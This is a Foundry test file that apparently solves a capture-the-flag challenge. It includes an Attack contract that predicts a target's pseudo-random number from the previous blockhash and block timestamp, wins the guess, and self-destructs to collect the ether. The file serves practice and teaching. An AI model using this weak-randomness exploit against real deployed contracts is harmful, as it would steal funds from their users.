// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GuessNewNumber.sol";

contract Attack {
    function getRandomNumber() public view returns (uint8) {
        return (
            uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(block.number - 1),
                            block.timestamp
                        )
                    )
                )
            )
        );
    }

    function attack(GuessTheNewNumberChallenge target) public payable {
        target.guess{value: 1 ether}(getRandomNumber());
        selfdestruct(payable(msg.sender));
    }
}

contract GuessNewNumberTest is Test {
    GuessTheNewNumberChallenge public target;
    address player = vm.addr(1);

    function setUp() public {
        target = new GuessTheNewNumberChallenge{value: 1 ether}();
        vm.deal(player, 1 ether);
    }

    function testIsComplete() public {
        vm.startPrank(address(player));
        Attack attack = new Attack();
        target.guess{value: 1 ether}(attack.getRandomNumber());
        assertTrue(target.isComplete());
    }
}
